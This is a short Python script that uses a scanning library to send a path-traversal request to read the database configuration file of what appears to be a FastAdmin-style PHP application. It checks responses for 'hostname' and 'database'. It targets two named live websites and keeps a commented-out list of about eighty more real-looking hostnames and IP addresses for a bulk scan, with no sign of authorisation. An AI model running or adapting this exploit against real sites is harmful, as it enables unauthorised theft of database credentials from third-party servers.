from geefox import GeeFoxDriver,ProcessConstructor

p=ProcessConstructor()
p.request_constructor("GET","/index/ajax/lang?lang=..//..//application/database")
p.rule_constructor("keyword",["hostname","database"])
p.rule_constructor("code",[200,201],logic="any")
# p.rule_constructor("custom",["response_status==200 and response_size>100 and response_size<1000"])
driver=GeeFoxDriver(p)
r=driver.scan(["https://www.xiangjiuye.com:443","https://back.tjyunsen.com:443"],output=False)
print(r)
print(p.output())
# js=[
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.feelsight.cn"}},"ip":"139.129.153.247","url":"https://www.feelsight.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.leinuolab.cn"}},"ip":"47.96.135.185","url":"https://www.leinuolab.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.xiangjiuye.com"}},"ip":"211.149.243.103","url":"https://www.xiangjiuye.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"sdyunjin.cn"}},"ip":"140.143.228.227","url":"https://sdyunjin.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"yashi.hemeikouqiang.com"}},"ip":"182.92.194.14","url":"https://yashi.hemeikouqiang.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"gonghaike.cn"}},"ip":"118.190.209.200","url":"https://gonghaike.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"ocr.zhaocaipaipai.com"}},"ip":"47.110.38.136","url":"https://ocr.zhaocaipaipai.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"sc.lcjl.dianyuesoft.com"}},"ip":"47.115.219.134","url":"https://sc.lcjl.dianyuesoft.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"douyin.wefanli.top"}},"ip":"120.24.97.6","url":"https://douyin.wefanli.top:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"zhgkadmin.dingdingxiujia.com"}},"ip":"60.205.106.66","url":"https://zhgkadmin.dingdingxiujia.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.zhongkexiaomage.com"}},"ip":"47.114.88.95","url":"https://www.zhongkexiaomage.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"im.lylsnet.com"}},"ip":"47.93.9.54","url":"https://im.lylsnet.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"back.tjyunsen.com"}},"ip":"60.28.189.108","url":"https://back.tjyunsen.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"test.longsheng.world"}},"ip":"43.138.57.213","url":"https://test.longsheng.world:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"baojia.qzkaiyun.com.cn"}},"ip":"114.55.4.80","url":"https://baojia.qzkaiyun.com.cn:443"},
# {"port":80,"service":{"name":"http","http":{"host":"43t4555.cdk3102.cn"}},"ip":"43.133.40.121","url":"http://43t4555.cdk3102.cn:80"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.8oaedu.cn"}},"ip":"124.221.236.38","url":"https://www.8oaedu.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"w.dltcw.net"}},"ip":"123.207.77.98","url":"https://w.dltcw.net:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"as.feeltech.net"}},"ip":"39.98.93.43","url":"https://as.feeltech.net:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"hexu.baigebao.com"}},"ip":"121.37.182.70","url":"https://hexu.baigebao.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"home3.baigebao.com"}},"ip":"121.37.174.221","url":"https://home3.baigebao.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"lsaler.campgreenbox.com"}},"ip":"152.136.147.249","url":"https://lsaler.campgreenbox.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"cjgr.net"}},"ip":"8.134.80.180","url":"https://cjgr.net:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"api.tonglu666.top"}},"ip":"112.74.93.92","url":"https://api.tonglu666.top:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.imilianx.top"}},"ip":"8.142.80.177","url":"https://www.imilianx.top:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"qsfj.hainans.net"}},"ip":"39.108.216.206","url":"https://qsfj.hainans.net:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"chain.yunxin123.com"}},"ip":"39.96.87.42","url":"https://chain.yunxin123.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"mjyjapp.ncymj.com"}},"ip":"47.118.56.209","url":"https://mjyjapp.ncymj.com:443"},
# {"port":80,"service":{"name":"http","http":{"host":"slyywmall.ziyuinfor.com"}},"ip":"47.105.205.36","url":"http://slyywmall.ziyuinfor.com:80"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"tier.jinghuli.cn"}},"ip":"39.105.163.0","url":"https://tier.jinghuli.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"ml.merit-academy.com"}},"ip":"47.101.133.217","url":"https://ml.merit-academy.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"yikang.test.jhwangluo.com"}},"ip":"8.140.26.134","url":"https://yikang.test.jhwangluo.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"open.rnnch.com"}},"ip":"47.105.214.254","url":"https://open.rnnch.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"m.guaiguaixiu.com"}},"ip":"39.99.184.74","url":"https://m.guaiguaixiu.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"show.wodesky.com"}},"ip":"47.97.183.115","url":"https://show.wodesky.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"share.multilateralx.com"}},"ip":"8.135.123.196","url":"https://share.multilateralx.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"ccarepro.com"}},"ip":"39.106.49.53","url":"https://ccarepro.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"llcxlly.com"}},"ip":"120.55.15.30","url":"https://llcxlly.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"test.cosmini.cn"}},"ip":"120.76.173.14","url":"https://test.cosmini.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"dingexpress.cn"}},"ip":"39.105.114.126","url":"https://dingexpress.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"haobangshou.jhwangluo.com"}},"ip":"39.98.108.188","url":"https://haobangshou.jhwangluo.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"dylj1.huidesichuang.com"}},"ip":"120.77.55.130","url":"https://dylj1.huidesichuang.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"sy.shantangjie.com.cn"}},"ip":"117.80.119.170","url":"https://sy.shantangjie.com.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"mifeng.qidian2018.com"}},"ip":"47.102.125.179","url":"https://mifeng.qidian2018.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"baili.baigebaodev.com"}},"ip":"121.37.190.251","url":"https://baili.baigebaodev.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"exam.firelinks.cn"}},"ip":"112.74.93.40","url":"https://exam.firelinks.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"chat.hddxy.cn"}},"ip":"62.234.214.192","url":"https://chat.hddxy.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"new.xinjingwuhui.cn"}},"ip":"211.149.140.78","url":"https://new.xinjingwuhui.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"buyer-api.luyaosoft.com"}},"ip":"1.13.176.8","url":"https://buyer-api.luyaosoft.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"newoa.tahoecn.com"}},"ip":"58.22.121.229","url":"https://newoa.tahoecn.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"ccbpic.cincon.cn"}},"ip":"47.113.81.134","url":"https://ccbpic.cincon.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.51maiju.cn"}},"ip":"47.92.65.156","url":"https://www.51maiju.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.gxzli.com"}},"ip":"120.25.192.194","url":"https://www.gxzli.com:443"},
# {"port":7474,"service":{"name":"http","http":{"host":"f.axp.com.cn"}},"ip":"121.40.251.78","url":"http://f.axp.com.cn:7474"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"check.xzad1.com"}},"ip":"47.95.254.225","url":"https://check.xzad1.com:443"},
# {"port":9005,"service":{"name":"http","http":{"host":"rac.yuegames.com"}},"ip":"47.100.102.47","url":"http://rac.yuegames.com:9005"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"s317.sipu.dhh2.aoyoux.com"}},"ip":"47.104.160.67","url":"https://s317.sipu.dhh2.aoyoux.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.tfafa.com"}},"ip":"39.108.238.27","url":"https://www.tfafa.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"gddy020.com"}},"ip":"8.134.126.108","url":"https://gddy020.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"api.ylkny.com"}},"ip":"1.95.90.129","url":"https://api.ylkny.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"temp.crm-cfpd.com"}},"ip":"47.107.160.47","url":"https://temp.crm-cfpd.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"zjgqniu.jzhxwl.com"}},"ip":"124.236.97.251","url":"https://zjgqniu.jzhxwl.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"zqt.55of.com"}},"ip":"47.105.57.91","url":"https://zqt.55of.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"angelina.redbookchina.cn"}},"ip":"47.92.96.4","url":"https://angelina.redbookchina.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"chat.sosoq.net"}},"ip":"121.229.55.230","url":"https://chat.sosoq.net:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"biyechachong.com"}},"ip":"121.199.163.68","url":"https://biyechachong.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"fastadmin.vr-1.net"}},"ip":"8.130.28.36","url":"https://fastadmin.vr-1.net:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"xiaojiaoyu.com"}},"ip":"119.91.252.234","url":"https://xiaojiaoyu.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"admin.wmst.kc87.com"}},"ip":"101.34.132.13","url":"https://admin.wmst.kc87.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"erp.weptt.com"}},"ip":"39.107.143.210","url":"https://erp.weptt.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"mgr.thescreenmedia.com"}},"ip":"39.98.148.38","url":"https://mgr.thescreenmedia.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"micro.quanoukeji.com"}},"ip":"106.14.251.217","url":"https://micro.quanoukeji.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"gz2022.gddyth.com"}},"ip":"175.27.226.186","url":"https://gz2022.gddyth.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"git.hongfs.cn"}},"ip":"120.24.214.67","url":"https://git.hongfs.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"test.xinranguoji.net"}},"ip":"118.190.216.154","url":"https://test.xinranguoji.net:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"houtai.hunqingziyuan.com"}},"ip":"39.99.173.214","url":"https://houtai.hunqingziyuan.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.richqiu.cn"}},"ip":"8.136.24.29","url":"https://www.richqiu.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"www.kmyijie.cn"}},"ip":"121.41.123.29","url":"https://www.kmyijie.cn:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"blog.imv.cc"}},"ip":"47.110.232.255","url":"https://blog.imv.cc:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"console.tianyinvod.com"}},"ip":"101.37.18.168","url":"https://console.tianyinvod.com:443"},
# {"port":443,"service":{"name":"http/ssl","http":{"host":"yb.cdhuyun.cn"}},"ip":"47.101.131.128","url":"https://yb.cdhuyun.cn:443"}
# ]
# url_list = [item['url'] for item in js]
# r=driver.scan(url_list,True,30,output=True)

